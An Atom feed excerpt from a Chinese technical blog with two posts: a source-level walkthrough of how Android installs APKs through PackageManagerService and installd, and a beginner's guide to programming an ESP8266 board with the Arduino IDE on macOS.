<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-08-01T10:29:23.735Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android应用安装过程深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/08/01/android-apk-install-process/android-apk-install-process/</id>
    <published>2019-08-01T07:08:31.000Z</published>
    <updated>2019-08-01T10:29:23.735Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Android应用安装过程深度解析"><a href="#Android应用安装过程深度解析" class="headerlink" title="Android应用安装过程深度解析"></a>Android应用安装过程深度解析</h3><blockquote><p>本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。</p></blockquote><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。</p><h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><p>一个 Android 应用安装到手机上大致分为四种情形：</p><ul><li>系统应用，在设备每次启动时完成安装</li><li>通过 adb install 命令安装</li><li>应用市场安装，封装安装过程（略）</li><li>第三方应用安装或双击安装包，会启动系统应用引导安装</li></ul><p>无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。</p><h4 id="场景一：系统应用安装"><a href="#场景一：系统应用安装" class="headerlink" title="场景一：系统应用安装"></a>场景一：系统应用安装</h4><p>在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801151901799.png?raw=true" alt="image-20190801151901799"></p><p><strong>补充：system_server 的启动与运行流程</strong></p><p>system_server 由 zygote 进程孵化，是整个 Android Framework 的基础</p><p>zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152013042.png?raw=true" alt="image-20190801152013042"></p><p>ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信</p><p>RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法</p><p>SystemServer 的 run() 方法中会完成以下工作：</p><ul><li>设置时间、语言等，设置虚拟机库文件，设置内存</li><li>Looper.prepareMainLooper() 主线程 looper 运行在当前线程</li><li>加载库文件 android_servers，位于 /frameworks/base/services</li><li>createSystemContext() 初始化系统上下文</li><li>SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中</li><li>启动各种系统服务，包括引导服务、核心服务、其他服务</li><li>开启循环，等待其他线程通过 handler 发送消息到主线程来处理</li></ul><p>在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152050671.png?raw=true" alt="image-20190801152050671"></p><p>PackageManagerService 类构造函数中完成了许多工作，主要包含：</p><ul><li>创建 Settings 对象，添加系统的 SharedUser 信息</li><li>为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的</li><li>创建 PackageDexOptimizer 和 DexManager 对象</li><li>获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures</li><li>创建 ServiceThread 和 PackagerHandler 对象</li><li>创建 UserManagerService，支持多用户</li><li>读取系统定义的权限保存到 permConfig 变量中</li><li>读取系统共享库保存到 libConfig 变量中</li><li>解析 package.xml 文件中的内容保存到 ArrayMap<string, packageparser.package=""> 结构中</string,></li><li>配置扫描参数 scanFlags</li><li>开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app</li><li>开始扫描非系统应用，包括目录 /data/app、/data/app-private</li><li>启动内存垃圾回收</li><li>启动私有服务 PackageManagerInternal</li></ul><p>总结来说主要是这几项内容：</p><ul><li>创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接</li><li>扫描各目录下 apk文件完成安装（建立各安装包的配置结构信息，并添加到全局列表中进行管理）</li><li>创建了 PackageHandler 对象并建立消息循环，接收外部的安装请求</li><li>解析权限，建立底层 Linux Kernel 的用户机制和虚拟机层权限机制之间的映射</li></ul><p>详细说明各项：</p><p>Installer 是 PackageManagerService 的一个内部类，继承自SystemService，协助完成安装过程，主要是进行 apk 格式转换和数据目录建立，封装对文件和路径操作，真正的安装工作交由 IInstalld 内部类对象完成。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152128607.png?raw=true" alt="image-20190801152128607"></p><p>Installer 在 SystemServer 中启动，通过 SystemServiceManager 的 startService(Installer.class) 启动。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152145965.png?raw=true" alt="image-20190801152145965"></p><p>构造函数 Installer() 初始化 context 和 isolated（是否真正连接installd）成员变量</p><p>重写 onStart() 方法，基于 isolated 判断是否调用 connect() 进行连接</p><p>connect() 通过 ServiceManager 获取 installd 服务并拿到服务的本地代理放到成员变量 mInstalld 中</p><p>Installer 调用 dexopt() 最终调用了 mInstalld 的dexopt() 方法，其他方法类似，几乎就是一个 IInstalld 类的封装</p><p><strong>!!!!  Installer 的实现变化很大：6.0 上通过以命令的方式通过 execute 方法执行；8.1 通过 AIDL 接口实现</strong></p><p><strong>PackageManageService（system权限） 与 installd（root权限） 守护进程共同完成应用管理</strong></p><p>PackageManagerService 的构造函数中会扫描许多应用目录来安装 apk</p><p>包括：</p><ul><li>系统应用，目录有 <code>/vender/overlay</code>、<code>/system/framework</code>、<code>/system/priv-app</code>、<code>/system/app</code>、<code>/vendor/app</code>、<code>/oem/app</code></li><li>非系统应用，目录有 <code>/data/app</code>、<code>/data/app-private</code></li></ul><p>调用的方法是 <code>scanDirTracedLI()</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152328199.png?raw=true" alt="image-20190801152328199"></p><p>可以看到依次调用 scanDirLI()、scanPackageLI()、scanPackageInternalLI()</p><p>其中，scanDirLI() 调用了 ParallelPackageParser 类进行解析，从名字也能看出做了一些并行的优化处理，真正的工作还是交给 PackageParser 来完成，PackageParser 的 parsePackage() 方法内部完成了应用的解析，实际上是解析了 AndroidManifest.xml 文件里面各个标签，包括包名、版本、权限、各组件这些信息，最后的解析结果放在 PackageParser.Package 类中返回给 PMS，这样 PMS 就拥有应用的信息便与做各种管理</p><p>后面继续调用了 scanPackageLI() 和 scanPackageInternalLI() 是进一步检测应用是否需要更新，如果需要更新则接着调用 createInstallArgsForExisting() 构造安装参数开始安装（后面还会遇到这个函数，暂时不展开），安装涉及到的签名校验也是在这里，调用了 collectCertificatesLI()、compareSignatures() 等</p><h4 id="场景二：adb-命令安装"><a href="#场景二：adb-命令安装" class="headerlink" title="场景二：adb 命令安装"></a>场景二：adb 命令安装</h4><p>adb 是 Android SDK 提供的一个命令行工具，为客户端-服务器架构，服务端为移动端上运行的守护进程 adbd，与 installd 一样由 init 进程创建</p><p>源码路径为：<a href="http://androidxref.com/8.1.0_r33/xref/system/core/adb/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/system/core/adb/</a></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152448109.png?raw=true" alt="image-20190801152448109"></p><p>adb_commandline() 函数接收 adb 命令行参数，调用 install_app() 执行安装流程，这个函数会对命令行做一些修改，实际上调用 pm 命令，并通过 send_shell_command() 将命令发送给 Pm 类。</p><p>Pm 启动函数 main 会构造 Pm 类对象并调用 run() 方法，在这个方法里首先会获取 PackageManger 服务 mPm，然后调用 getPackageInstaller() 获取 PackageInstaller 对象 mInstaller，最后基于不同的命令调用不同的方法。</p><p>runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152518924.png?raw=true" alt="image-20190801152518924"></p><p>PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。</p><p>发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。</p><p>PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。</p><h4 id="场景三：第三方应用安装"><a href="#场景三：第三方应用安装" class="headerlink" title="场景三：第三方应用安装"></a>场景三：第三方应用安装</h4><p>当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作</p><p>PackageInstaller 的应用代码位于：<a href="http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/</a></p><p>安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152605993.png?raw=true" alt="image-20190801152605993"></p><p>应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。</p><p>然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。</p><p>用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152635344.png?raw=true" alt="image-20190801152635344"></p><p>InstallInstalling 这个类会拿到应用数据开启真正的安装流程。</p><p>首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。</p><p>接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。</p><p>最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去</p><p>这里就跟 adb 安装走到了同一个流程中。</p><h4 id="深入-PMS-中的安装"><a href="#深入-PMS-中的安装" class="headerlink" title="深入 PMS 中的安装"></a>深入 PMS 中的安装</h4><p>上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152711796.png?raw=true" alt="image-20190801152711796"></p><p>在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。</p><p>所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。</p><p><strong>1、处理 INIT_COPY 消息</strong></p><p>首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。</p><p><strong>2、处理 MCS_BOUND 消息</strong></p><p>首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152741833.png?raw=true" alt="image-20190801152741833"></p><p>HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中，</p><p>InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法</p><p>以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制</p><p>HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152755489.png?raw=true" alt="image-20190801152755489"></p><p> installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法</p><p>其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看  installNewPackageLI() 流程</p><p>installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF()</p><p><strong>3、处理 POST_INSTALL 消息</strong></p><p>首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等</p><h4 id="安装过程小结"><a href="#安装过程小结" class="headerlink" title="安装过程小结"></a>安装过程小结</h4><p>与应用相关的一些目录</p><ul><li><p>/system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力</p></li><li><p>/system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用</p></li><li><p>/data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下</p></li></ul><ul><li><p>/data/data：用户应用数据存放路径，存在沙箱隔离</p></li><li><p>/data/dalvik-cache：存放应用的dex 文件</p></li><li><p>/data/system：存放应用安装相关文件</p><ul><li>packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表</li><li>package.list 指定应用的默认存储位置，userid 等</li></ul></li></ul><p>应用安装过程总结</p><ol><li>将应用 apk 拷贝到指定目录下</li><li>解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/<packagename> 数据目录</packagename></li><li>解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中</li><li>由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上</li></ol><h4 id="PMS-与-PM-与APM"><a href="#PMS-与-PM-与APM" class="headerlink" title="PMS 与 PM 与APM"></a>PMS 与 PM 与APM</h4><p>前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152858658.png?raw=true" alt="image-20190801152858658"></p><p>通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象</p><p>ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理</p><p>继续梳理一下这个类与 PMS 之间的关系</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152915992.png?raw=true" alt="image-20190801152915992"></p><p>IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法</p><p>IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface</p><p>IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager</p><ul><li>asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象</li><li>asBinder() 方法返回自身，即 IPackageManager.Stub 对象</li><li>重写了 onTransact() 方法，根据命令类型处理数据传输</li></ul><p>IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口</p><ul><li>mRemote对象是IBinder类型，是对IPackageManager.Stub的引用</li><li>重写了asBinder()方法，返回mRemote</li><li>实现了AIDL文件定义的接口</li></ul><p>PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能：</p><ul><li>安装/卸载/更新应用，包括 installPackage/</li><li>查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表</li><li>查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象</li><li>查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象</li><li>增加/删除权限，包括 addPermission/removePermission</li><li>清除用户数据/缓存/代码等</li></ul><p>PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集</p><p>ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法</p><p>PackageManagerService 继承了 IPackageManager.Stub</p><p>因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://androidxref.com/8.1.0_r33/xref/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/</a></li><li><a href="https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6" target="_blank" rel="external">https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6</a></li><li><a href="http://solart.cc/2016/10/30/install_apk/" target="_blank" rel="external">http://solart.cc/2016/10/30/install_apk/</a></li><li><a href="https://www.jianshu.com/p/4f16421d5c7f" target="_blank" rel="external">https://www.jianshu.com/p/4f16421d5c7f</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android应用安装过程深度解析&quot;&gt;&lt;a href=&quot;#Android应用安装过程深度解析&quot; class=&quot;headerlink&quot; title=&quot;Android应用安装过程深度解析&quot;&gt;&lt;/a&gt;Android应用安装过程深度解析&lt;/h3&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-07-30T16:32:08.675Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Arduino-ESP8266开发板上手实践"><a href="#Arduino-ESP8266开发板上手实践" class="headerlink" title="Arduino ESP8266开发板上手实践"></a>Arduino ESP8266开发板上手实践</h3><h4 id="环境搭建（macOS）"><a href="#环境搭建（macOS）" class="headerlink" title="环境搭建（macOS）"></a>环境搭建（macOS）</h4><p>官方说明：<a href="https://github.com/esp8266/Arduino">https://github.com/esp8266/Arduino</a></p><ul><li><p><strong>安装IDE （Arduino IDE）</strong></p><p>下载地址：<a href="https://www.arduino.cc/en/main/software" target="_blank" rel="external">https://www.arduino.cc/en/main/software</a></p><p>还有种方式是利用<a href="https://github.com/plerup/makeEspArduino">Makefile</a>去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。</p></li></ul><ul><li><p><strong>下载ESP8266硬件包</strong></p><p>1 、在设置里面的附加板管理器网址中增加以下链接<code>https://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143145367.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、在工具中找到你的开发板，然后进入开发板管理器，搜索<strong>esp8266</strong>安装该库，我这里已经安装了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143643887.png?raw=true" width="500" hegiht="313" align="center"></p><p>注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考<a href="https://github.com/esp8266/Arduino">这里</a></p></li><li><p><strong>运行示例代码</strong></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730144157955.png?raw=true" width="500" hegiht="313" align="center"></p><p>我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。</p><p>代码如下</p><pre><code class="c">/*  ESP8266 Blink by Simon Peter  Blink the blue LED on the ESP-01 module  This example code is in the public domain  The blue LED on the ESP-01 module is connected to GPIO1  (which is also the TXD pin; so we cannot use Serial.print() at the same time)  Note that this sketch uses LED_BUILTIN to find the pin with the internal LED*/void setup() {  pinMode(LED_BUILTIN, OUTPUT);     // Initialize the LED_BUILTIN pin as an output}// the loop function runs over and over again forevervoid loop() {  digitalWrite(LED_BUILTIN, LOW);   // Turn the LED on (Note that LOW is the voltage level  // but actually the LED is on; this is because  // it is active low on the ESP-01)  delay(1000);                      // Wait for a second  digitalWrite(LED_BUILTIN, HIGH);  // Turn the LED off by making the voltage HIGH  delay(2000);                      // Wait for two seconds (to demonstrate the active low LED)}</code></pre><p>在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。</p></li></ul><h4 id="重要！！！一些坑以及注意点"><a href="#重要！！！一些坑以及注意点" class="headerlink" title="重要！！！一些坑以及注意点"></a>重要！！！一些坑以及注意点</h4><p>下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。</p><p>确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。</p><p>1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。<a href="https://developer.apple.com/download/more/" target="_blank" rel="external">下载地址1</a> <a href="https://github.com/vulgo/IORegistryExplorer">下载地址2</a> <a href="https://mac.softpedia.com/get/System-Utilities/IORegistryExplorer.shtml" target="_blank" rel="external">下载地址3</a>在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145128956.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过<code>Virtual COM Port</code>去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的<code>/dev</code>目录下并没有出现对应的文件。之前的驱动大多是这个<a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">CH340G CH34G CH34X Mac OS X driver</a> 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在<a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers" target="_blank" rel="external">这里</a>。安装完以后在<code>/dev</code>就应该有一个<code>tty.SLAB_USBtoUART</code>的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145909934.png?raw=true" width="500" hegiht="313" align="center"></p><h4 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h4><p>这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下</p><ul><li><p><a href="https://www.arduino.cc/en/guide/macOSX?setlang=cn" target="_blank" rel="external">https://www.arduino.cc/en/guide/macOSX?setlang=cn</a></p><p>在Mac OS X系统上入门Arduino/ Genuino</p></li><li><p><a href="https://juejin.im/post/5b569026e51d4513ee6dd509" target="_blank" rel="external">https://juejin.im/post/5b569026e51d4513ee6dd509</a></p><p>Esp8266+Arduino+Mac开发环境搭建</p></li><li><p><a href="https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/" target="_blank" rel="external">https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/</a></p><p>Program an ESP8266 from Arduino on MacOS</p></li><li><p><a 